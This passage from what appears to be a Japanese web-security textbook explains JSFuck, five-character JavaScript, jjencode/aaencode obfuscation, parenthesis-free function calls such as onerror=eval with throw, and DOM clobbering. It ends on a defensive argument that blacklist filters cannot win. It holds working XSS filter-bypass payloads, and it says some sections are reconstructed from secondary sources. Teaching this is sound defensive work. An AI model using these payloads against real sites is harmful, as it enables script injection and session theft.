!![]   // true  （二重否定でtrue）
```
> なぜ動くか: `!` は引数を真偽値へ強制変換する単項演算子。空配列 `[]` はJSでは「真」なので `![]` は `false`。

**(2) 数値をつくる（`+`）**

```js
+[]              // 0    （空配列を数値化すると0）
+!+[]            // 1    （+[]=0 → !0=true → +true=1）
!+[]+!+[]        // 2    （true+true=2）
```
> なぜ動くか: 単項 `+` は値を数値へ変換する。`+[]` は `0`、`!0` は `true`、`true` を `+` で数値化すると `1`。これらを足し合わせて任意の整数を作れる。

**(3) 文字列と文字を取り出す（`+[]` で文字列化 → 添字アクセス）**

真偽値・数値を空配列と足すと**文字列**になり、そこから1文字ずつ取り出せます。

```js
![]+[]           // "false"
!![]+[]          // "true"
[][[]]+[]        // "undefined" （存在しないプロパティ参照はundefined）
+[![]]+[]        // "NaN"
(![]+[])[+[]]    // "false"[0] = "f"
(![]+[])[!+[]+!+[]]  // "false"[2] = "l"
```
> なぜ動くか: `値 + []`（空配列との連結）はその値を文字列に変換する。`"false"`, `"true"`, `"undefined"`, `"NaN"` から `f,a,l,s,e,t,r,u,d,i,n,N` などの文字が得られる。添字は上で作った数値で指定する。

**(4) さらに多くの文字を集める（指数表記・toString(36)）**

`"undefined"` から得た `"e"` を使って指数表記の数（`"1e309"→Infinity`）を作ると `I,f,n,t,y,.,+,-` が、数値の `toString(36)`（36進数化）を使うと `a`〜`z` の全小文字が手に入ります。

```js
(11)["toString"](36)   // "b"
(35)["toString"](36)   // "z"
```
> なぜ動くか: `Number.prototype.toString(基数)` は2〜36進数の文字列を返す。基数36なら数字と全アルファベット小文字を表現でき、`10→"a"`, `35→"z"` のように任意の小文字を数値経由で生成できる。

**(5) 最後の鍵：`Function` コンストラクタ（`()`）**

集めた文字で `"constructor"` という文字列を組み立て、`[]["constructor"]` などから **`Function` コンストラクタ**へ到達します。`Function` は文字列を関数本体として受け取り、任意コードを実行する「マスターキー」です。

```js
[]["fill"]["constructor"]("alert(1)")()          // = Function("alert(1)")() = alert(1)を実行
[]["fill"]["constructor"]("return this")()       // = window（グローバルオブジェクト）を取得
```
> なぜ動くか: あらゆる関数の `constructor` は `Function` コンストラクタ。`Function("コード")` は `eval` と同等の「文字列をコードとして実行する」能力を持ち、しかも `window` への参照が不要。`"return this"` を本体にすれば戻り値としてグローバルスコープ（`window`）が手に入り、以降あらゆるグローバル変数へアクセスできる。この2段構え（`constructor.constructor` 相当 → `Function` → 実行）が短縮・難読化の共通の心臓部。

こうして、`alert(1)`（本来22文字弱）は6文字だけで書けますが、代償として**数千文字**に膨れ上がります（JSFuck公式のサンプルでは `alert(1)` が約数KB）。実行結果は完全に同一です。フィルタ回避の観点では、「`alert` も `script` も英数字も一切含まないのに任意コードが動く」ことが決定的です。

#### 3.3 「6文字の壁（Wall of Six）」を破る — 5文字への挑戦

長らくJSFuckの6文字が最小と考えられ、「6文字の壁（The Wall of Six）」と呼ばれてきました。これを**5文字**へ削る研究が2016〜2017年に相次ぎ、その一角を担ったのが樹下雅章氏の発表「5文字で書くJavaScript」です。代表的な5文字アルファベットは次の3系統です（Sylvain Pollet-Villard の Xchars.js が整理）。

- **`$+=[]`（Martin Kleppe「$five」系）**: `$` を変数名として使い、`=` で代入、`+` と `[]` で値を組み立てる。`(` `)` `!` を捨てる代わりに `$` と `=` を導入する（6−3+2=5）。関数呼び出しに括弧を使えない問題は、**特定バージョンのライブラリ（jQuery UI 1.12.4 の DatePicker の公開プロパティ）を踏み台**にしてコード注入・実行を成立させる、という「ガジェット依存」で解決している。
- **`[+=_]` / `[$+=]`（Xchars.js のその他の系統）**: いずれも特定IDのスクリプトや特定版jQuery UIなど、外部の「足場」を前提に成立する。
- **`[]+|>`（樹下雅章「パイプライン演算子」系）**: これが樹下氏の寄与。

**樹下氏のパイプライン演算子アプローチの原理**（`[` `]` `+` `|` `>` の5文字）:

1. JSFuckの `!`（真偽値づくり）を **`>` で置き換える**。比較演算子 `>` は真偽値を返すので、`[]>[]`（false）等で `![]` の代替になる（JSFuck公式READMEも「`!` は `<` や `=`、`>` で代替しうる」と明記）。しかも `>` は「片方をシフト演算 `>>` に使って数を作る」など多用途。
2. JSFuckの `(` `)`（関数呼び出し）を **パイプライン演算子 `|>` で置き換える**。`x |> f` は概ね `f(x)` に相当し、括弧なしで関数適用ができる。`|>` は `|` と `>` の2文字だが、`>` は既に(1)で使うため、**新規に増えるのは `|` の1文字だけ**。
3. 差し引き: `[]()!+`（6）から `!` `(` `)` を落とし（−3）、`|` を足す（+1）と、残るのは `[` `]` `+` `|` `>` の **5文字**。

> なぜ「5文字」に収まるか: `>` が「真偽値の生成」と「パイプライン `|>` の一部」を**兼任**する点が鍵。1文字に2役をさせることで、追加コストを `|` の1文字だけに抑え、6文字の壁を割った。

**重大な但し書き（バージョン・仕様依存）**: パイプライン演算子 `|>` は **TC39（JavaScriptの標準化委員会）の提案段階の機能**であり、2026年時点でも言語標準には入っていません。ネイティブのブラウザでは動かず、**Babel（トランスパイラ）のプラグインでのみ**評価できます。したがって樹下氏の5文字アプローチは「理論上・特定処理系上での到達点」であり、素のブラウザに対する実戦XSSでそのまま5文字を使えるわけではありません。実戦で頼れる汎用手法は依然としてJSFuckの6文字（および後述の記号系難読化）です。この「理論的下限」と「実戦での可用性」の区別は重要です。

#### 3.4 括弧なしで関数を呼ぶ他の方法（応用の引き出し）

JSFuck公式READMEは、`()` を使わずに関数を実行する代替手段も列挙しており、XSSでの応用が効きます。

- **テンプレートリテラル（バッククォート）**: `` f`...` `` はタグ付きテンプレートとして `f` を呼び出す。例: `alert`1`` は `alert("1")` 相当（引数は文字列に限られる）。
- **イベントハンドラへの代入**: `onerror=f;throw 1` や `onload=f`、`onhashchange=f;location.hash=1` などで、括弧なしに関数を発火させる（`=` が必要）。
- **`new` 演算子**: `new f` でコンストラクタとして呼ぶ。
- **暗黙の型変換（`toString`/`valueOf`）**: メソッドを `toString` に割り当て、文字列化のタイミングで暗黙実行する。
- **`Symbol.toPrimitive` / `Symbol.iterator`**: シンボルで暗黙呼び出しを誘発する。

> XSS実務での含意: 「`(` `)` が禁止」という制約に対しても、バッククォートやイベントハンドラで関数を発火できる。文字種制限は「表現の言い換え」でしばしば回避可能——これが短縮JavaScriptの実戦的な教訓です。

> 出典: JSFuck — Write any JavaScript with 6 Characters `[]()!+`（Martin Kleppe / aemkei, README・jsfuck.js） — https://github.com/aemkei/jsfuck
> 出典: 5文字で書くJavaScript / Shibuya.XSS techtalk #10（Masato Kinugawa） — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-10
> 出典: Xchars.js（Sylvain Pollet-Villard, 5文字系統の整理） — https://slides.com/sylvainpv/xchars-js/ ／ $five（Martin Kleppe） — https://aem1k.com/five/

---

### 4. 難読化JavaScript — 記号だけで書くjjencode / aaencode（資料3 / はせがわ）

> ⚠️ **未取得の資料**: 「難読化JavaScript（はせがわようすけ）」は自動取得できませんでした（理由: docswell.com がネットワークのエグレス制限で全面ブロックされているため）。以下のURLからユーザーご自身で直接ご覧ください: https://www.docswell.com/s/hasegawa/K9VW8M-jsobfus
>
> （以下は、はせがわようすけ氏が作成したjjencode／aaencodeの原理を、JSFuckと同じ土台の上で対比しながら復元した解説です。氏の関連資料「JavaScript難読化読経」等も参照しています。）

#### 4.1 難読化とは何か、なぜ攻撃・防御双方で重要か

**難読化（obfuscation）**とは、コードの動作は変えずに、人間（および単純なパターンマッチ）にとって読み取りにくい形へ変形する処理です。攻撃側の動機は主に2つ。

1. **シグネチャ検知（既知の悪性パターンとの一致で検出する方式）の回避**: WAF・アンチウイルス・EDRなどが「`document.cookie` を外部へ送る」「`eval(` を使う」といった特徴文字列で検出するのを、別表記に化けさせてすり抜ける。
2. **解析の遅延**: マルウェア解析者やサンドボックスによる自動解析を妨害する。

防御側（本教科書の主眼）にとって重要なのは、**「難読化されていても、最終的にはブラウザ／エンジンが元のコードとして実行する」**という事実です。つまり難読化は入口対策（パターン検知）を無力化しうる一方、根本対策（出力エンコード・CSP・危険sinkの排除）は難読化の有無に一切影響されません。はせがわ氏の一貫した結論も「**難読化はセキュリティではない（obfuscation is not security）**」——攻撃を隠せても防げず、防御は難読化に依存してはならない、というものです。

#### 4.2 記号だけで書く共通原理：`constructor.constructor` → `Function` → 実行

jjencode・aaencode・JSFuckは、見た目こそ大きく違いますが、**心臓部は完全に同一**です。すなわち:

```js
(0).constructor            // Number
(0).constructor.constructor // Function（Numberの生成元＝Function）
[].constructor.constructor  // 同上（Arrayから）
({}).constructor.constructor // 同上（Objectから）
```
> なぜ動くか: プリミティブ値やオブジェクトの `.constructor` はそれを生んだ組み込み関数（`Number`, `Array`, `Object` など）を指し、**関数の `.constructor` は必ず `Function`**。よって `任意の値.constructor.constructor` は `Function` コンストラクタに到達し、`Function("コード")()` で任意JSを実行できる。JSFuckが英字を型変換で組み立てて到達したのと同じゴールへ、jjencode/aaencodeは「記号だけで数字・文字列を組み立てて」到達する。

#### 4.3 jjencode — 18種類の記号だけでJavaScriptを書く（2009年 / はせがわ）

**jjencode**（はせがわようすけ、2009年7月公開）は、任意のJavaScriptを **`[ ] ( ) ! + , " $ . : ; _ { } ~ =` の18種類の記号だけ**で表現するエンコーダです。生成物の構造は次のとおり（既定のグローバル変数名は `$`）。

```js
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,
$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,
$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};
$.$_=($.$_=$+"")[$.$$_]+ ... ;   // 以降、文字列部品を組み立て
$.$($.$( ... )());               // 最後にFunctionコンストラクタで本体を実行
```

構造の読み解き:

- **`$=~[]` で `-1` を得る**: `~[]` はビット否定。`[]` は数値化すると `0`、`~0` は `-1`。これを起点に `++$` で `0, 1, 2, …` と数値を量産する。
> なぜ動くか: `~`（ビット反転）は `~0 == -1`。ここから前置インクリメント `++$` を繰り返して整数を作り、後述の文字取り出しの添字に使う。
- **記号から文字を掘り出す**: `(![]+"")` は `"false"`、`(!""+"")` は `"true"`、`({}+"")` は `"[object Object]"`。これらを添字で切り出し、`f,a,l,s,e,t,r,u,o,b,j,c,...` を集める。
> なぜ動くか: JSFuckと同じ「真偽値・オブジェクトを文字列化して1文字ずつ取る」原理。使える文字種を記号だけに保ったまま、`"constructor"` などのメソッド名を組み立てられる。
- **最後に `Function` を呼ぶ**: 組み立てた `"constructor"` から `$.$`（＝ `Function` 相当）を作り、本体文字列を渡して実行する。

はせがわ氏自身が指摘するとおり、jjencodeは**復号が容易**で、真の防御にはなりません（実際、専用デコーダが多数存在）。しかしその教育的価値は絶大で、「記号だけで任意コードが書ける」という事実が、後のJSFuck（2012年）へ直接つながりました。JSFuckのREADMEやWikipediaも「jjencode / aaencode と同じ基本原理」と明記しています。

#### 4.4 aaencode — JavaScriptを顔文字（AA）に変える（はせがわ）

**aaencode**（はせがわようすけ）は、jjencodeと**まったく同じ原理**を使いつつ、生成物を**日本語の顔文字（kaomoji / アスキーアート）**の羅列に化けさせるエンコーダです。出力は常に次のようなヘッダで始まります。

```js
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ);
（ﾟДﾟ） =（ﾟΘﾟ）= (o^_^o)/ (o^_^o); ... （ﾟДﾟ）['_']( （ﾟДﾟ）['_'] ) (b) ;
```
> なぜ動くか: `(ﾟΘﾟ)`, `(ﾟｰﾟ)`, `(o^_^o)`, `（ﾟДﾟ）` などは**単なる変数名・値の入れ物**にすぎない。jjencode同様に `0/1/数値`、文字列部品を組み立て、最後に `（ﾟДﾟ）['_'](...)` の形で `Function` を呼び出して本体を実行する。顔文字はあくまで「見た目の衣装」で、JavaScriptエンジンにとっては普通の識別子と演算子の連なりである。

aaencodeの狙いは、**人間には完全にノイズにしか見えないのに、エンジンには正しく動く**という極端な可読性破壊です。マルウェアが解析妨害やシグネチャ回避に用いた例があり、逆に防御側は「顔文字だらけのJS＝要警戒」というヒューリスティックで検知することもあります。

#### 4.5 難読化の一般的な道具箱（はせがわ資料の全体像）

記号系エンコーダは難読化の一形態にすぎません。はせがわ氏の資料群（「難読化JavaScript」「JavaScript難読化読経」等）は、実戦で使われる難読化手法を体系立てています。防御側が「見た目に騙されない」ために、代表的な引き出しを押さえておきます。

- **文字列の分割・連結**: `"aler"+"t"`、`["al","ert"].join("")` のようにキーワードを断片化して検知を逃れる。
- **文字コードによる表現**: `String.fromCharCode(97,108,101,114,116)` → `"alert"`。あるいは `\x61\x6c…`（16進エスケープ）、`a…`（Unicodeエスケープ）、`\141`（8進エスケープ）で1文字ずつ表す。
> なぜ動くか: JS文字列リテラルは複数のエスケープ表記を許し、いずれもパース時に同じ文字へ復元される。フィルタが生の `alert` を探しても、エスケープ表記は一致しない。
- **動的評価への集約**: 断片を組み立てた文字列を `eval(...)` / `Function(...)()` / `setTimeout("...")` / `location='javascript:...'` へ渡して実行する。難読化の「出口」はほぼ必ずこの動的評価に収束する。
- **プロパティアクセスの分解**: `window["ale"+"rt"]`、`top[/al/.source+/ert/.source]` のようにブラケット記法で危険な名前を組み立てる。
- **エンコード方式の入れ子**: URLエンコード → HTML実体参照 → JSエスケープと多層に包み、フィルタのデコード段数とブラウザのデコード段数の差を突く（前セクションのInvictiの論点と同根）。
- **既製の難読化ツール**: `eval(function(p,a,c,k,e,d){...})` で知られる Dean Edwards の Packer、各種商用難読化ツールなど。

はせがわ氏はさらに**文字コード（エンコーディング）に潜むセキュリティ**の研究でも知られ、ページの文字コード指定の欠落や解釈差（UTF-7、ISO-2022-JP 等）が、そのままフィルタ回避・難読化の足場になることを示してきました（資料1の文字コード系バイパスと表裏一体）。

> 出典: 難読化JavaScript（はせがわようすけ / docswell） — https://www.docswell.com/s/hasegawa/K9VW8M-jsobfus
> 出典: jjencode — Encode any JavaScript program using only symbols（Yosuke Hasegawa） — https://utf-8.jp/public/jjencode.html
> 出典: JavaScript難読化読経（はせがわようすけ / docswell） — https://www.docswell.com/s/hasegawa/5JQ44Z-obfuscation

---

### 5. 本セクションの結論：短縮・難読化は「フィルタ敗北」の構成的証明である

3つの資料を統合すると、一つの命題が浮かび上がります。

> **「危険なパターンを列挙して弾く」防御（ブラックリスト／WAF／ブラウザ内蔵XSSフィルター）は、攻撃側が“同じ動作を無限の別表記で書ける”限り、原理的に勝てない。**

- 資料1（XSSフィルターの使い方）は、ブラウザベンダが総力を挙げて作った内蔵フィルターですら、保護しない文脈・回避・逆用によって役に立たず、ついに**廃止**された事実を示す。
- 資料2（5文字で書くJavaScript）は、`alert` も英数字も一切使わず、たった5〜6文字で任意コードが書けることを示し、「特定文字・単語の禁止」という発想の無力さを証明する。
- 資料3（難読化JavaScript）は、記号だけ・顔文字だけでも動くことを示し、「見た目の特徴で検知する」防御の限界を突く。

したがって、これらは「攻撃テクニック集」であると同時に、**なぜ入力ブラックリストに頼ってはいけないか**の決定的な論拠でもあります。防御の正解は一貫しています。

1. **文脈依存の出力エンコード**（HTMLボディ／属性／JS文字列／URL／CSSの各文脈に応じた正しいエスケープ）で、そもそも入力が「コード」として解釈される経路を断つ。
2. **危険なsinkの回避**（`innerHTML`・`eval`・`Function`・`document.write`・`location` への未検証代入を使わない。使うなら Trusted Types 等で守る）。
3. **CSP（特に `strict-dynamic` + nonce/hash）** を多層防御として併用し、万一の注入時にもスクリプト実行を封じる。ただしCSP自体もJSONP・信頼ライブラリのガジェット・`constructor.constructor` 等で回避されうるため、あくまで根本対策の上に重ねる保険と位置づける。
4. **ブラウザ内蔵XSSフィルターに依存しない**（既に廃止済み）。`X-XSS-Protection` は今日では設定してもほぼ無意味。

短縮・難読化JavaScriptを学ぶ本当の目的は、奇怪なペイロードを暗記することではなく、**「フィルタで守る」という発想そのものを捨てる**という設計判断を、腹の底から納得することにあります。

---

## 書籍 JavaScript for hackers（Gareth Heyes）

この節では、XSS（クロスサイトスクリプティング＝攻撃者が用意した JavaScript を被害者のブラウザ上で実行させる脆弱性）研究の第一人者である **Gareth Heyes**（ガレス・ヘイズ。英国 PortSwigger 社の主席研究者で、Burp Suite 拡張 Hackvertor やファジングツール Shazzer の作者）の書籍 **『JavaScript for hackers: Learn to think like a hacker』** を取り上げます。この本は「反射型の素朴な XSS は知っているが、その先の高度な領域を体系的に学びたい」という、まさに本教科書の読者層に向けて書かれた一冊で、**「ペイロードを暗記する」のではなく「JavaScript とブラウザの仕様の隙間を自分で見つけ出す発想（think like a hacker）」** を鍛えることを主眼としています。

書籍そのものは有料（Leanpub / Amazon で販売）で本文全文を機械的に取得することはできませんでしたが、本書の内容は著者自身が PortSwigger Research で公開してきた一連の研究記事を土台に再構成されたものであり、それらの一次記事および書評・目次情報から、扱う技法をほぼ余さず再現できます。以下では、まず取得状況を明示したうえで、本書が扱う技法を章の流れに沿って詳しく解説します。

> ⚠️ **未取得の資料**: 「JavaScript for hackers（Gareth Heyes, Leanpub）」は自動取得できませんでした（理由: 販売ページ leanpub.com および二次配布元・Google Books・著者サイト garethheyes.co.uk・PortSwigger 本体まで含め、本実行環境のネットワーク egress プロキシがすべてのドメインへの直接アクセスを遮断しており、有料書籍のため本文 PDF も参照不可）。以下の URL からユーザーご自身で直接ご覧ください: https://leanpub.com/javascriptforhackers

（以下は、取得できなかった上記書籍の内容を、著者 Gareth Heyes が PortSwigger Research 等で公開している一次研究記事・書籍の目次情報・書評、および一般的な専門知識に基づいて再構成した解説です。個々の技法には、その根拠となった公開記事を出典として付します。）

### 本書の位置づけと構成

本書のキャッチコピーは "Learn to think like a hacker"（ハッカーのように考えることを学べ）で、初版は 2022 年、その後 2023 年・2024 年と改訂が重ねられています。序盤で JavaScript ハッキングの基礎を固めたのち、**「括弧を使わない JavaScript ペイロードの構築」「ファジングによる新しいブラウザ挙動の発見」「DOM ハッキングと DOM Clobbering」「プロトタイプ汚染」「非英数字 JavaScript」「最新の XSS テクニック」** へと段階的に踏み込む構成になっています。書評・目次断片から確認できる章立ては概ね次のとおりです。

- 第1章 Introduction（導入・本書の狙い）
- 第2章 **JavaScript without parentheses**（括弧なし JavaScript）
- （中盤）**Fuzzing**（ブラウザ挙動をファジングで発掘する手法）
- **DOM for hackers**（DOM Clobbering を含む DOM ハッキング）
- **Browser exploits / SOP bypasses**（各ブラウザの Same-Origin Policy 回避）
- **Prototype pollution**（クライアント／サーバーサイドのプロトタイプ汚染）
- **Non-alphanumeric JavaScript**（非英数字 JavaScript）
- **XSS techniques**（HTML エンティティ、イベント、hidden input、popover などの実戦テクニック）
- Credits（謝辞・参考文献）

> 出典: JavaScript for hackers（書籍紹介・目次断片）— https://leanpub.com/javascriptforhackers ／ Google Books — https://books.google.com/books/about/JavaScript_for_hackers.html?id=FVWjEAAAQBAJ ／ Amazon — https://www.amazon.com/JavaScript-hackers-Learn-think-hacker/dp/B0BRD9B3GS

本書の一貫したメッセージは、**「XSS の本質は文字列の暗記ではなく、JavaScript 言語仕様とブラウザ実装のギャップを実験で炙り出すこと」** です。以下、章ごとにその「仕組み」を掘り下げます。

---

### 括弧なし JavaScript（JavaScript without parentheses）

本書の看板テーマです。多くの XSS フィルタ（危険な入力を検知・除去する仕組み）や WAF（Web Application Firewall＝Web アプリの手前で悪意ある通信を遮断する仕組み）は、関数呼び出しに不可欠な丸括弧 `(` `)` を禁止したり、`alert(` のような「関数名＋括弧」のパターンを弾いたりします。また、JavaScript 文字列を書けても引用符やセミコロンが使えない、といった **限定された文字集合（charset）** の状況が実戦では頻繁に起こります。そこで「括弧を一文字も使わずに任意の関数を呼ぶ」技法群が武器になります。

本書は、Heyes が段階的に発見してきた「括弧なしで関数を呼ぶ複数の方法」を、なぜ動くのかという仕組みごと解説します。PortSwigger の記事「The seventh way to call a JavaScript function without parentheses（括弧なしで JavaScript 関数を呼ぶ7番目の方法）」で列挙された代表的な手法は以下です。

> 出典: The seventh way to call a JavaScript function without parentheses — PortSwigger Research — https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses

#### 方法1: タグ付きテンプレートリテラル

```javascript
alert`1337`
```

なぜ動くか: ES6 の **タグ付きテンプレート（tagged template）** は、関数名の直後にバッククォート文字列 `` `...` `` を置くと、その関数が呼び出される言語仕様です。`alert`1337`` は内部的に `alert(["1337"])`（正確には文字列部分の配列と埋め込み値を引数に）として実行されます。丸括弧を一切書かずに関数を起動できるため、`(` `)` を禁止するフィルタを素通りします。埋め込み `${...}` を使えば引数も動的に渡せます。

#### 方法2: onerror ハンドラと throw 文

```javascript
onerror=alert;throw'XSS'
```

なぜ動くか: `window.onerror` は **JavaScript の例外が発生するたびに自動的に呼ばれる** グローバルなエラーハンドラです。`onerror=alert` で「例外時に alert を呼べ」と仕込み、`throw'XSS'` で意図的に例外を投げると、ブラウザは `onerror` を第1引数にエラーメッセージ（ここでは投げた文字列を含む）を渡して呼び出します。結果として `alert` が実行されます。**関数の呼び出し（括弧）をブラウザのエラー処理機構に肩代わりさせる** のが核心です。

セミコロンすら使えない場合は、`throw` が「式」を受け取れることを利用してカンマ演算子で一文にまとめます。

```javascript
throw onerror=alert,'some string',123,'haha'
```

なぜ動くか: `throw` に続く `onerror=alert,'some string',...` はカンマ演算子でつながった一つの式で、左から順に評価されます。まず `onerror=alert` の代入が行われ、最後の値が throw される（＝例外になる）ため、セミコロンで文を区切らなくても代入と例外送出を同時に成立させられます。

さらに **任意コードの実行** に発展させるのが本書の白眉で、`alert` の代わりに `eval` を仕込みます。

```javascript
onerror=eval;throw'=alert\x281\x29'
```

なぜ動くか: Chrome は投げられた例外メッセージの先頭に文字列 `Uncaught ` を付けます。したがって `onerror=eval` に渡されるメッセージは `Uncaught =alert(1)` となり、これがそのまま `eval("Uncaught =alert(1)")` として評価されます。JavaScript はこれを「`Uncaught` という（未宣言の）変数に `alert(1)` の結果を代入する」有効な文と解釈するため、`alert(1)` が実行されます。`\x28` `\x29` は括弧 `(` `)` の16進エスケープで、文字列リテラル内なので括弧を直接書かずに済みます。**「Uncaught を変数名として再利用する」** という発想がポイントです。

ただしこの手法は **ブラウザ依存** です。Firefox は接頭辞が二単語の `uncaught exception: ` になるため、evalに渡すと `uncaught` と `exception` の間で構文エラーになり動きません（対象: Chrome 系。この差はブラウザのエラーメッセージ実装に由来し、時期により変わり得る点に注意）。

> 出典: XSS without parentheses and semi-colons — PortSwigger Research — https://portswigger.net/research/xss-without-parentheses-and-semi-colons ／ Explaining XSS without parentheses and semi-colons — Huli's blog — https://blog.huli.tw/2025/09/15/en/xss-without-semicolon-and-parentheses/

#### 方法3: Function コンストラクタ

```javascript
Function`x${'alert\x281337\x29'}x`
```

なぜ動くか: `Function` は文字列を関数本体としてコンパイルする組み込みコンストラクタで、これもタグ付きテンプレートで起動できます。文字列として渡したコードが新しい関数として生成されます（実戦では生成した関数をさらに起動する必要があり、後述の非英数字 JavaScript で多用される `[]['constructor']['constructor'](...)` の系譜につながります）。フィルタが `eval` を名指しで弾いていても、`Function` 経由で同等のコード実行に到達できるのが利点です。

#### 方法4: Symbol.hasInstance と instanceof

```javascript
'alert\x281337\x29'instanceof{[Symbol['hasInstance']]:eval}
```

なぜ動くか: `instanceof` 演算子は、右辺のオブジェクトが `Symbol.hasInstance` という特別なメソッドを持つ場合、**そのメソッドを左辺の値を引数にして呼び出す** という仕様があります。ここでは右辺のオブジェクトの `Symbol.hasInstance` に `eval` を割り当てているため、`eval('alert(1337)')` が呼ばれます。演算子の裏側でブラウザが関数呼び出しを行うので、括弧を書く必要がありません。`Symbol['hasInstance']` とブラケット記法にしているのはドット記法を嫌うフィルタ対策です。

#### 方法5: valueOf / toString による型強制

```javascript
valueOf=alert;window+''
```

なぜ動くか: オブジェクトを文字列や数値に「型強制（coercion）」するとき、JavaScript は内部的にそのオブジェクトの `valueOf()` や `toString()` を呼びます。`valueOf=alert` でグローバル（＝`window.valueOf`）を alert に差し替えておき、`window+''`（window を文字列と連結）で型強制を発火させると、その過程で `valueOf` すなわち `alert` が呼び出されます。**演算子（ここでは `+`）による暗黙の型変換に関数呼び出しを潜り込ませる** 手口です。

#### 方法6: 配列メソッド（sort / map）+ call

```javascript
[].sort.call`${alert}1337`
[].map.call`${eval}\u{61}lert\x281337\x29`
```

なぜ動くか: タグ付きテンプレートは `関数.call\`...\`` の形にすると、`call` の第1引数（＝呼び出し先の `this`）にテンプレートの文字列配列が、以降の引数に埋め込み値が渡されます。上の `sort` の例では `this` が文字列配列、比較関数（コンパレータ）に `alert` が渡され、**sort が内部でコンパレータを配列要素を引数にして呼び出す** ため、結果的に `alert` が起動します。`map` の例も同様に、`map` が内部でコールバック `eval` を各要素（`"alert(1337)"`）を引数に呼ぶため `eval` が実行されます。`\u{61}` は `a` の Unicode エスケープで、`alert` という綴りを検知するフィルタを回避します。`.call` を挟むのは、`[].sort\`...\`` と直接書くと sort が正しい `this` を得られず「illegal invocation（不正な呼び出し）」エラーになるのを避けるためです。

#### 方法7: DOMMatrix（本書が「7番目」と呼ぶ手法）

```javascript
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
```

なぜ動くか: `DOMMatrix`（CSS 変換行列を表すブラウザ API）は、文字列化（`x+''`）すると `matrix(1337, 0, 0, 1, 0, 0)` のような **関数呼び出しの形をした文字列** を生成します。ここで `matrix=alert` とグローバル変数 `matrix` に alert を割り当てておき、`location='javascript:'+x` で `javascript:matrix(1337,0,0,1,0,0)` という URL に遷移させると、`matrix(...)` すなわち `alert(1337,...)` が実行されます。**括弧は DOMMatrix の文字列化が自動生成してくれる** ため、攻撃者自身は一つも括弧を打たずに済むのが妙味です。`x.a=1337` で行列の第1要素を書き換え、alert に渡る引数を任意に制御しています。

> 出典: JavaScript without parentheses using DOMMatrix — PortSwigger Research — https://portswigger.net/research/javascript-without-parentheses-using-dommatrix

本書はこれらを単なるペイロード集としてではなく、**「JavaScript の言語仕様のどの機能が、開発者の想定を超えて関数呼び出しに転用できるか」** という視点で整理しており、読者が未知の状況で自力で新しい「括弧なし」ベクタを設計できるようになることを目標にしています。これは JavaScript サンドボックスや WAF の回避にそのまま応用できる基礎体力です。

---

### ファジングでベクタを発見する（Fuzzing）

本書のもう一つの中核は、**「既知のペイロードを試すのではなく、ブラウザに大量の入力を機械的に浴びせて未知の挙動を見つける」** ファジング（fuzzing）の実践です。宣伝文句どおり「数秒で数百万の文字をファジングする」手法を扱います。Heyes が自作した二つのツールが主役です。

- **Hackvertor**: `@` で始まるタグ（例: `<@base64>...</@base64>`）で入力を入れ子に変換できる、Java 製の Burp Suite 拡張。XSS・SQLi 用のエンコード／文脈依存エスケープ／多段変換を自動化します。Heyes はこれを使い、**JavaScript URL の中で ISO-2022-JP のエスケープシーケンス（文字コード切り替え制御）が使えてしまう** といった、文字コード再解釈に起因する回避ベクタを発見しています（文字コードの切り替えによってブラウザが本来無害なはずのバイト列を別の文字として解釈し直す、という「仕組みの隙間」の典型例）。
- **Shazzer**: ブラウザ上で動作する高速ファジング基盤で、XSS ベクタやエンコードのエッジケースを多数の文脈で同時に検証できます。「どの文字が、どの文脈で、どのブラウザで特別扱いされるか」を総当たりで可視化する「ブラウザの癖（browser quirks）」発見ツールです。

なぜファジングが有効か: HTML パーサ（構文解析器）や JavaScript エンジンには、仕様書に明記されていない実装依存の挙動や、歴史的経緯で残った寛容な解釈（error recovery）が無数に潜んでいます。人間が思いつく範囲を超えて全文字・全組み合わせを機械的に試すことで、フィルタ設計者が想定していない「隙間文字」や「状態遷移のバグ」を体系的に掘り当てられます。本書はこれを **「振る舞いファジング（behavioural fuzzing）」** として方法論化しています。

> 出典: Provoking browser quirks with behavioural fuzzing — PortSwigger Research — https://portswigger.net/research/provoking-browser-quirks-with-behavioural-fuzzing ／ Hackvertor（Gareth Heyes）— https://github.com/hackvertor

---

### DOM ハッキングと DOM Clobbering

本書は DOM（Document Object Model＝ページを構成する要素のツリー構造）を攻撃面として扱う章を設け、その代表格として **DOM Clobbering（DOM クロバリング）** を詳解します。DOM Clobbering は、**スクリプトを一切使わずに（HTML 属性だけで）JavaScript のグローバル変数やプロパティを「上書き（clobber）」する** 技法で、Heyes 自身が 2013 年頃に体系化した古典です。CSP（Content Security Policy）などでスクリプト実行が制限されている環境でも、HTML の注入さえできれば成立し得る点で重要です。

> 出典: DOM clobbering — Wikipedia — https://en.wikipedia.org/wiki/DOM_clobbering ／ DOM Clobbering — PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DOM%20Clobbering/README.md

基本原理: HTML 要素に `id` または `name` 属性を付けると、その値と同名のグローバル変数（`window` のプロパティ）として要素が参照できてしまう、という **「名前付きアクセス（named access on the window object）」** の仕様が根源です。

```html
<a id=x href="javascript:alert(1)">click</a>
<!-- これ以降、JavaScript から window.x や単に x で <a> 要素を参照できる -->
```

なぜ動くか: ブラウザは後方互換のため、`id` を持つ要素を同名のグローバルとして公開します。アプリのコードが `if (window.x) { ... }` のように「設定されていないはず」の変数を前提にしていると、攻撃者が `<a id=x>` を注入するだけでその条件を真にでき、ロジックを乗っ取れます。

より強力なのが **`id` と `name` を連鎖させてネストしたプロパティ（`a.b.c`）を捏造する** 手口です。

```html
<a id=config><a id=config name=url href="https://evil/">
```

